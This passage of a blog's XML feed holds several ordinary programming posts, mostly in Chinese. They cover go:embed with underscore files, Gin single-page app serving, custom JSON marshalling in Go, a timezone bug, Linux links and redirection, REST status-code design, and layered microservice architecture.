<li><strong>缺点</strong>：可能会带来延迟，队列的处理速度可能成为瓶颈。</li>
</ul>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在go embed中包含有下划线(_)的文件 + Gin SPA</title>
    <url>/articles/coding/go-embed-with-underscore/</url>
    <content><![CDATA[<h1 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h1><p>使用 <code>all</code>标题来解决问题。</p>
<p>related issue: <a href="https://github.com/golang/go/issues/43854">go@issue43854</a></p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:embed public</span></span><br><span class="line"><span class="keyword">var</span> fs embed.FS</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>今天在尝试用<code>go embed</code>来提供前端文件的时候遇到了一个问题，有些文件就是加载不出来。</p>
<p><img data-src="/home/aynakeya/workspace/blog/source/images/go-embed-with-underscore/image-20240215190617849.png" alt="image-20240215190617849"></p>
<p>我用了这个函数尝试获取所有文件，看看到底是哪里出了问题</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getAllFilenames</span><span class="params">(fs *embed.FS, dir <span class="type">string</span>)</span></span> (out []<span class="type">string</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(dir) == <span class="number">0</span> &#123;</span><br><span class="line">		dir = <span class="string">&quot;.&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	entries, err := fs.ReadDir(dir)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, entry := <span class="keyword">range</span> entries &#123;</span><br><span class="line">		fp := path.Join(dir, entry.Name())</span><br><span class="line">		<span class="keyword">if</span> entry.IsDir() &#123;</span><br><span class="line">			res, err := getAllFilenames(fs, fp)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			out = <span class="built_in">append</span>(out, res...)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		out = <span class="built_in">append</span>(out, fp)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>from <a href="https://gist.github.com/clarkmcc/1fdab4472283bb68464d066d6b4169bc">source</a></p>
</blockquote>
<p>我得到了如下输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[public/200.html public/404.html public/admin/credential/index.html public/admin/login/index.html public/admin/panel/index.html public/favicon.ico public/index.html public/search/answer/index.html public/search/article/index.html] &lt;nil&gt;</span><br></pre></td></tr></table></figure>

<p>发现任何在<code>_nuxt</code>文件夹下的文件都不在里面。于是我猜测go embed默认不会包含开头为<code>_</code>的文件或者文件夹</p>
<p>经过搜索，果然发现了解决方案。</p>
<p><a href="https://github.com/golang/go/issues/43854">https://github.com/golang/go/issues/43854</a></p>
<p>使用<code>all</code>即可</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:embed all:pattern</span></span><br></pre></td></tr></table></figure>



<h1 id="Gin-Gingle-Page-Application"><a href="#Gin-Gingle-Page-Application" class="headerlink" title="Gin Gingle Page Application"></a>Gin Gingle Page Application</h1><p>solution</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type GinSPA struct &#123;</span><br><span class="line">	sgin.CommonApp</span><br><span class="line">	fsEmbed fs.ReadFileFS</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func NewGinSPA(fsEmbed *embed.FS, fsPrefix string) *GinSPA &#123;</span><br><span class="line">	fsys, err := fs.Sub(fsEmbed, fsPrefix)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	return &amp;GinSPA&#123;</span><br><span class="line">		fsEmbed: fsys.(fs.ReadFileFS),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (g *GinSPA) Create(engine *gin.Engine, router gin.IRouter) error &#123;</span><br><span class="line">	engine.NoRoute(g.handleSpa)</span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func (g *GinSPA) handleSpa(c *gin.Context) &#123;</span><br><span class="line">	path := c.Request.URL.Path</span><br><span class="line">	if len(path) &gt; 0 &#123;</span><br><span class="line">		path = path[1:]</span><br><span class="line">	&#125;</span><br><span class="line">	if data, err := g.fsEmbed.ReadFile(path); err == nil &#123;</span><br><span class="line">		c.Data(200, mime.TypeByExtension(filepath.Ext(path)), data)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	if data, err := g.fsEmbed.ReadFile(&quot;index.html&quot;); err != nil &#123;</span><br><span class="line">		c.String(404, &quot;404 Not Found&quot;)</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		c.Data(200, mime.TypeByExtension(&quot;.html&quot;), data)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>embed</tag>
      </tags>
  </entry>
  <entry>
    <title>在go中自定义Json序列化</title>
    <url>/articles/coding/golang-custom-json-marshalling-translation/</url>
    <content><![CDATA[<p>本文仅为翻译，原文链接-&gt;<a href="http://choly.ca/post/go-json-marshalling/">Custom JSON Marshalling in Go</a></p>
<span id="more"></span>

<p>Go自带一个包<code>encoding/json</code>，这个包使序列化结构体(<code>struct</code>)和反序列化<code>json</code>变得异常简单。</p>
<p>例子</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyUser <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID       <span class="type">int64</span>     <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">	Name     <span class="type">string</span>    <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	LastSeen time.Time <span class="string">`json:&quot;lastSeen&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	_ = json.NewEncoder(os.Stdout).Encode(</span><br><span class="line">		&amp;MyUser&#123;<span class="number">1</span>, <span class="string">&quot;Ken&quot;</span>, time.Now()&#125;,</span><br><span class="line">	)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Ken&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lastSeen&quot;</span><span class="punctuation">:</span><span class="string">&quot;2009-11-10T23:00:00Z&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>但是，如果我想改变序列化之后其中一个field的值应该怎么做呢？比如，我们想要把LastSeen修改为Unix时间戳的形式。</p>
<p>一个简单的方法就是使用一个辅助的结构体并在调用<code>MarshalJSON</code>方法的时候在辅助结构体内填上正确的格式。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *MyUser)</span></span> MarshalJSON() ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> json.Marshal(&amp;<span class="keyword">struct</span> &#123;</span><br><span class="line">		ID       <span class="type">int64</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">		Name     <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">		LastSeen <span class="type">int64</span>  <span class="string">`json:&quot;lastSeen&quot;`</span></span><br><span class="line">	&#125;&#123;</span><br><span class="line">		ID:       u.ID,</span><br><span class="line">		Name:     u.Name,</span><br><span class="line">		LastSeen: u.LastSeen.Unix(),</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方法当时使可以的，但是如果一个结构体有很多个字段<code>field</code>，那么这种方法就比较麻烦了（笨重.jpg）。最好可以直接把原来的结构体放进辅助结构体里，让辅助结构体继承所有不要被改变的field，只添加需要被改变的field。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *MyUser)</span></span> MarshalJSON() ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> json.Marshal(&amp;<span class="keyword">struct</span> &#123;</span><br><span class="line">		LastSeen <span class="type">int64</span> <span class="string">`json:&quot;lastSeen&quot;`</span></span><br><span class="line">		*MyUser</span><br><span class="line">	&#125;&#123;</span><br><span class="line">		LastSeen: u.LastSeen.Unix(),</span><br><span class="line">		MyUser:   u,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是问题是，这个辅助的结构体同样会继承<code>MarshalJSON</code>这个方法，这样就会导致无限循环(其实就是<code>MarshalJSON</code>调用<code>MarshalJSON</code>)。</p>
<p>解决方法就是给原始的结构体做一个别名，这个别名会继承原始结构体的所有field但不会继承方法。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *MyUser)</span></span> MarshalJSON() ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">type</span> Alias MyUser</span><br><span class="line">	<span class="keyword">return</span> json.Marshal(&amp;<span class="keyword">struct</span> &#123;</span><br><span class="line">		LastSeen <span class="type">int64</span> <span class="string">`json:&quot;lastSeen&quot;`</span></span><br><span class="line">		*Alias</span><br><span class="line">	&#125;&#123;</span><br><span class="line">		LastSeen: u.LastSeen.Unix(),</span><br><span class="line">		Alias:    (*Alias)(u),</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的方法可以用到<code>UnmarshalJSON</code>中</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *MyUser)</span></span> UnmarshalJSON(data []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">type</span> Alias MyUser</span><br><span class="line">	aux := &amp;<span class="keyword">struct</span> &#123;</span><br><span class="line">		LastSeen <span class="type">int64</span> <span class="string">`json:&quot;lastSeen&quot;`</span></span><br><span class="line">		*Alias</span><br><span class="line">	&#125;&#123;</span><br><span class="line">		Alias: (*Alias)(u),</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := json.Unmarshal(data, &amp;aux); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	u.LastSeen = time.Unix(aux.LastSeen, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>翻译</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>How did I miss an interview</title>
    <url>/articles/coding/how-i-miss-my-interview/</url>
    <content><![CDATA[<p>In Feb.6 2022. I miss the interview with ****(name reducted). The reason for that is that my calendar had its sheduled interview time at 12:30 instead of 11:30.The event in the calendar was automatically added using an todo list application (a sub module of FMA) written by myself, so there must be a hidden bug I didn&#39;t find.</p>
<h2 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h2><p>I first analyze the process of event synchronization. There are basically two stage, the first stage is parsing, the second stage is send request to calendar api.</p>
<p>I first test calendar api using an unit test I&#39;ve already written. Everything works fine.</p>
<p>So, the problem occurs in time parsing stage.</p>
<p>After running another unit test, I found out there was a bug in time conversion. <strong>I forgot to change timezone value</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// to unix time</span><br><span class="line">currentTime.Add(time.Hour*(-7))</span><br></pre></td></tr></table></figure>

<p>because In Canada, there is a daylight saving time. In winnter, it is actually -8 instead of -7! </p>
<p>As a result, the calculated time is one hour later than the actual time.</p>
<h2 id="Fixing"><a href="#Fixing" class="headerlink" title="Fixing"></a>Fixing</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// to unix time</span><br><span class="line">currentTime.Add(time.Hour*delta)</span><br></pre></td></tr></table></figure>

<h2 id="Lesson-Learned"><a href="#Lesson-Learned" class="headerlink" title="Lesson Learned"></a>Lesson Learned</h2><p><strong>Never use your own application in real shit</strong></p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux中软链接(soft link)和硬链接(hard link)的区别</title>
    <url>/articles/coding/linux-hard-link-vs-soft-link/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>linux中, 有一个和windows快捷方式相似的功能，叫做链接 (<strong>Links</strong>). 在linux中, 创建链接可以使用命令<code>ln</code>. </p>
<p>但是ln可以创建两张链接, 一种是软链接 (<strong>soft link</strong>), 一种是硬链接(<strong>hard link</strong>)</p>
<p>软链接可以用 <code>ln -s src dest</code> 来创建</p>
<p>硬链接可以用 <code>ln src dest</code> 来创建</p>
<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>区别是啥呐? </p>
<p>首先linux中每个文件都有一个指定的Inode。 这个Inode就像是数据库中的一条数据。每个Inode都有一个自己指定的编号。</p>
<p>比如我们有一个文件 A(Inode # 1)。</p>
<h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><p>假如我们使用软链接创建一个文件B，那么这个文件B会有自己的一个Inode -&gt; B (Inode #2) 。 在这种情况下，文件B相当于一个快捷方式，指向了文件A的地址。</p>
<p>这种情况下，假如我们删除了文件A，那么文件B就指向一个不存在的地址，就相当于失效了。</p>
<h2 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h2><p>如果用硬链接，就不一样了。硬链接不是指向文件的地址，而是直接指向了文件的Inode。</p>
<p>比如用硬链接创建文件A的链接C，那么文件C会有和A一样的Inode ID -&gt; C (Inode #1)。</p>
<p>这种情况下，假如我们删除了文件A，文件C依然指向文件本身，所以链接C依旧可用。</p>
<p><em>可以把C看作是A的拷贝，但是他们指向的文件内容其实是一样的</em></p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Piping In Linux</title>
    <url>/articles/coding/linux-piping/</url>
    <content><![CDATA[<p>Linux piping in summary</p>
<table>
<thead>
<tr>
<th align="center">Symbol</th>
<th align="center">Purpose</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>|</code></td>
<td align="center">pipe standard out from one program to standard input of another</td>
</tr>
<tr>
<td align="center"><code>&lt;</code></td>
<td align="center">redirect standard in from a file</td>
</tr>
<tr>
<td align="center"><code>&gt;</code></td>
<td align="center">redirect standard out to a file, deleting its current contents</td>
</tr>
<tr>
<td align="center"><code>&amp;&gt;</code></td>
<td align="center">redirect both standard out and standard error to a file, deleting its current contents</td>
</tr>
<tr>
<td align="center"><code>&gt;&gt;</code></td>
<td align="center">redirect standard out to a file, adding to the end of tis current contents</td>
</tr>
<tr>
<td align="center"><code>&amp;&gt;&gt;</code></td>
<td align="center">redirect both standard out and standard error to a file, adding to the end of its current contents</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>在RESTful API中如何选择合适的HTTP状态码</title>
    <url>/articles/coding/my-approach-for-using-status-code-in-restful-api/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在最近的RESTful API设计过程中，我遇到了一个问题。当业务逻辑需要返回一个错误代码时，究竟应该遵循HTTP的原则返回对应的状态码，如200, 403, 500等，还是统一返回200，而将详细的错误信息写入响应体内？</p>
<p>这个问题涉及到了RESTful API是否应该遵循HTTP状态码的原则，让我们一起来探讨一下。</p>
<span id="more"></span>

<h2 id="搜寻"><a href="#搜寻" class="headerlink" title="搜寻"></a>搜寻</h2><p>先来看看其他公司的解决方案</p>
<p><img data-src="/images/coding/my-approach-for-using-status-code-in-restful-api/Prag_REST_errors_1.png" alt="compare"><br><em>Reference to Google Cloud</em></p>
<p>目前市面上的解决方案主要可以归类为两种：</p>
<ol>
<li>解决方案1：只使用200状态码，把所有的错误信息写在响应体里。</li>
<li>解决方案2：根据错误的类型，归类到不同的状态码并返回。</li>
</ol>
<p>这两种方案都有一定的道理。</p>
<p>比如在客户端调用时，大多数HTTP客户端都是按照HTTP的协议来设计的，例如axios。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    let result = await axios.get(&quot;/api&quot;);</span><br><span class="line">&#125; catch (e)&#123;</span><br><span class="line">    // do error hanlding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用状态码的方式返回可以让客户端快速判断出请求的状态 <em>[6]</em>， 从而做出相应的反应。</p>
<p>当然，反对者可能会认为这种方式过于繁琐，如果直接使用200作为所有请求的返回值，那么就不需要考虑其他请求状态了，直接依据body里的code作为判断依据岂不是更为简单？</p>
<p>然而，单纯使用200状态码作为返回值也并不理想，因为客户端通常依赖返回码来判断请求的状态。只返回200可能会让客户端错误地认为请求是正常的，而实际状态却可能是错误的。</p>
<p>此外，虽然HTTP通常被视为一个Application Layer(应用层协议)，但它在很多情况下更像是一个Transport Layer(传输层协议)。</p>
<p>比如API服务通过HTTP来实现，Web服务也通过API来实现。所以，当你尝试将HTTP的状态码和业务逻辑的错误代码组合在一起时，你必须先预定一个规则来确保错误代码与HTTP状态码的规则相符。例如，某个业务的错误代码对应某个HTTP状态码。</p>
<p>尽管这样在短期内可能显得整洁，但随着项目的发展，你要维护的规则可能会越来越多，有时候你甚至可能会违反自己的规则。因此，通过将错误类型归集到不同的状态码来返回的方法同样存在无法回避的问题。</p>
<h2 id="我的方案"><a href="#我的方案" class="headerlink" title="我的方案"></a>我的方案</h2><p>因此，在我看来，较好的方案应该是要分离HTTP逻辑与业务逻辑。应让各自负责自己的部分，即由HTTP处理HTTP的错误，而将业务逻辑的错误在HTTP中视为无错误。业务错误由客户端自己在body中获取。</p>
<p>总体而言，我的解决方案与第二个解决方案相似，但有所不同。</p>
<p>因为我的微服务框架包括三个层次：delivery（传递层）、service（服务层）和repository（仓储层）。传递层负责处理传入的HTTP请求，所有业务逻辑都在服务层内部处理。</p>
<p>由此，我直觉地将所有错误分为两个场景：第一个场景是在传递层发生的错误，这些错误直接与HTTP有关，例如参数验证、路径参数、URL、速率限制等。第二个场景是服务层发生的错误，包括仓储层错误和其他错误。</p>
<p>在将错误分为这两层之后，解决方案自然而然地浮现出来。如果错误发生在传递层，我将使用HTTP状态码进行响应。否则，我将使用200状态码，并在响应体内附带错误信息。</p>
<p>例子:</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *ginApp)</span></span> handleCreatePaste(c *gin.Context) &#123;</span><br><span class="line">    <span class="keyword">var</span> param pasteReq = pasteReq&#123;Expires: <span class="number">3600</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> err := c.ShouldBindJSON(&amp;param); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.JSON(http.StatusBadRequest, model.NewErrorCodeResponse(</span><br><span class="line">            errcode.ParameterError.WithDetail(err)))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> param.Title == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        param.Title = fmt.Sprintf(<span class="string">&quot;%s %s&quot;</span>, time.Now().Format(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>), c.ClientIP())</span><br><span class="line">    &#125;</span><br><span class="line">    paste, err := g.pasteSrv.CreatePaste(param.ContentType, param.Title, param.Content, param.Password, c.ClientIP(), param.Expires)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.JSON(http.StatusOK, model.TryErrorCodeResponse(err))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.JSON(http.StatusOK, model.NewDataResponse(paste))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我的这种方案的优势在于，如果客户端的请求方式正确，那么它只会收到200的响应，至于具体结果如何，则需要自己判断。如果请求方式错误，那么它会得到相应的HTTP状态码。</p>
<p>这样做实际上是对错误进行了分类和分别处理。只要客户端能保证请求方式正确，就不需要考虑状态码的问题。</p>
<p>当然，我的这种解决方案也不能完全避免上述的一些问题，更好的方案仍在开发中等待实现。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li>Web API Design: The Missing Link</li>
<li><a href="https://cloud.google.com/blog/products/api-management/restful-api-design-what-about-errors">https://cloud.google.com/blog/products/api-management/restful-api-design-what-about-errors</a></li>
<li><a href="https://softwareengineering.stackexchange.com/questions/305250/should-i-use-http-status-codes-to-describe-application-level-events">https://softwareengineering.stackexchange.com/questions/305250/should-i-use-http-status-codes-to-describe-application-level-events</a></li>
<li><a href="https://stackoverflow.com/questions/56736771/http-response-always-return-response-code-200-even-request-fail-and-return-stat">https://stackoverflow.com/questions/56736771/http-response-always-return-response-code-200-even-request-fail-and-return-stat</a></li>
<li><a href="http://cn.voidcc.com/question/p-xwqrmqht-bm.html">http://cn.voidcc.com/question/p-xwqrmqht-bm.html</a></li>
<li><a href="https://baijiahao.baidu.com/s?id=1693811021976970402&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1693811021976970402&amp;wfr=spider&amp;for=pc</a></li>
</ol>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
        <tag>http</tag>
        <tag>scene-series</tag>
      </tags>
  </entry>
  <entry>
    <title>稀音微服务框架开发日记 - 基础架构</title>
    <url>/articles/coding/scene-microservice-develop-diary-0/</url>
    <content><![CDATA[<p>我的微服务框架开发的也有一段时间了，今天就来简单介绍一下框架的基础架构吧</p>
<span id="more"></span>


<h1 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h1><p><img data-src="/images/scene-microservice-develop-diary-0/structure.jpg" alt="structure"></p>
<h1 id="架构概览"><a href="#架构概览" class="headerlink" title="架构概览"></a>架构概览</h1><p>架构的设计主要受到了Uncle Bob的Clean Architecture的启发。</p>
<p><strong>Uncle Bob的Clean Architecture</strong> 是一个流行的软件架构设计方法。它的核心思想是将系统分解为不同的层，每一层都有其明确的职责。这种分层的目的是使得系统更加模块化、可维护和可扩展。</p>
<h2 id="主体思想"><a href="#主体思想" class="headerlink" title="主体思想"></a>主体思想</h2><p>稀音微服务框架的核心思想即是模块化。</p>
<p>每个业务分割成最小的模块。在每个模块中，进一步分解为不同的层，每个层中都实现业务所定义的接口（以下统称为Interface）。</p>
<p>业务之间的项目调用是通过Interface来实现的，这样可以确保不涉及任何具体的业务实现。</p>
<p>首先，所有的路由层由<strong>Scenes</strong>统一定义并管理。在Scenes里，它包含了delivery的具体实现，即<strong>application</strong>。</p>
<p>每个业务都是架构中的一个单元，这个单元被称为Module。Module内部包含三个层：delivery, service 和 repository。</p>
<ul>
<li><strong>repository</strong> 是持久层，负责数据的存储和检索。</li>
<li><strong>service</strong> 是业务逻辑层，处理核心的业务流程。</li>
<li><strong>delivery</strong> 是与外部通信的层，负责处理如HTTP请求等的输入和输出。</li>
</ul>
<p>除此之外，还有一个 <strong>infrastructure</strong> 层，作为基础层，提供框架所必要的基础服务，如日志、配置管理等。</p>
<h2 id="Scenes"><a href="#Scenes" class="headerlink" title="Scenes"></a>Scenes</h2><p>Scenes负责定义不同的<strong>Application</strong>以及相对应的<strong>Application Container</strong>。</p>
<p><strong>Application Container</strong>是一个容器，它可以加载同类型的application并控制其启动和停止。</p>
<p>简而言之，Application Container负责管理和运行对于的application。</p>
<h2 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h2><p>Module定义了所有暴露给外部的Interface，这包括repository interface和service interface，以及相应的数据结构（struct）。这里不涉及任何具体的实现，具体的实现是由repository和service层来完成的。</p>
<p>在这个架构中，delivery层依赖于service，而service层依赖于repository。这三个层的依赖关系是通过依赖注入和控制反转技术来实现的，这样可以方便地替换不同的实现。</p>
<h3 id="Repository层"><a href="#Repository层" class="headerlink" title="Repository层"></a>Repository层</h3><p>Repository层相对简单，它负责与外部环境（如数据库）进行交互。它需要实现Module中定义的repository interface。这个层可以有多种实现，例如可以有针对MongoDB的实现、针对MySQL的实现等，这为依赖注入和控制反转提供了便利。</p>
<h3 id="Service层"><a href="#Service层" class="headerlink" title="Service层"></a>Service层</h3><p>Service层是业务逻辑的核心，它依赖于本Module的repository interface或其他Module的service interface。Service层不关心repository的具体实现，它只通过repository interface来调用，从而完成所有的业务逻辑。</p>
<h3 id="Delivery层"><a href="#Delivery层" class="headerlink" title="Delivery层"></a>Delivery层</h3><p>Delivery层包含了多种application的实现。例如，可以有基于HTTP的实现、基于WebSocket的实现、基于gRPC的实现等。</p>
<h2 id="Infrastructure层"><a href="#Infrastructure层" class="headerlink" title="Infrastructure层"></a>Infrastructure层</h2><p>Infrastructure层是框架的基础服务层，它提供了一些必要的服务，如配置管理、日志记录等。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li>Uncle Bob. (2012). <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">The Clean Architecture</a>.</li>
<li>Better Programming. <a href="https://betterprogramming.pub/the-clean-architecture-beginners-guide-e4b7058c1165">The Clean Architecture — Beginner’s Guide</a>.</li>
<li>Microsoft. <a href="https://learn.microsoft.com/en-us/dotnet/architecture/microservices/microservice-ddd-cqrs-patterns/ddd-oriented-microservice">Design a DDD-oriented microservice</a>.</li>
<li>ZQ99299. <a href="https://zq99299.github.io/note-book2/ddd/#%E6%8E%A8%E8%8D%90%E9%98%85%E8%AF%BB">DDD实践</a>.</li>
<li>Meituan Tech. (2017). <a href="https://tech.meituan.com/2017/12/22/ddd-in-practice.html?utm_source=wechat_session&utm_medium=social&utm_oi=698166473230680064">领域驱动设计在互联网业务开发中的实践</a>.</li>
<li>Go Dev. (2012). <a href="https://go.dev/talks/2012/splash.article">Go at Google: Language Design in the Service of Software Engineering</a>.</li>
<li>Ben Johnson. <a href="https://medium.com/@benbjohnson/structuring-applications-in-go-3b04be4ff091">Structuring Applications in Go</a>.</li>
<li>咖啡拿铁.<a href="https://juejin.cn/post/6844903636334542856">你的项目应该如何正确分层</a>你的项目应该如何正确分层</li>
</ol>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>scene-series</tag>
        <tag>microservices</tag>
      </tags>
  </entry>
  <entry>
    <title>项目分层中，缓存应该放在哪儿</title>
    <url>/articles/coding/should-i-use-cache-in-repository-or-service-layer/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>设计一个高效且完善的业务系统，通常会需要分层。目前主流的分层都大多包含三层delivery, service, repository。当然，我们有时会在这些基础层次之间进行扩展，如在service和repository之间加入一个manager层，正如阿里的架构那样。</p>
<p>层架构下每个层的职责变得清晰，利于实现业务逻辑已经开展迭代。</p>
<p>但是，在设计业务逻辑的时侯，我遇到了一个问题，也就是缓存。究竟是放在service 层更好还是 repository 层更好捏？</p>
<span id="more"></span>

<h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p>从大方向上来看，一群人认为，service不应干涉数据的来源。而另一群人认为，是否使用缓存的选择是一个业务逻辑决策。当然每个观点都有他的合理性。下面，我将对这两个观点进行对比分析：</p>
<h3 id="在Repository层中使用缓存"><a href="#在Repository层中使用缓存" class="headerlink" title="在Repository层中使用缓存"></a>在Repository层中使用缓存</h3><p><em>优点</em>:</p>
<ul>
<li><strong>数据源无关性</strong>：将缓存逻辑放在repository层，数据的来源对上层是透明的，这意味着Service层或Use Case层不需要知道数据是从缓存中取得还是从数据库或远程API取得。</li>
<li><strong>一致性</strong>：所有数据的访问，无论是从缓存还是直接从主数据源，都会通过repository层，确保数据的检索和管理方式始终一致。</li>
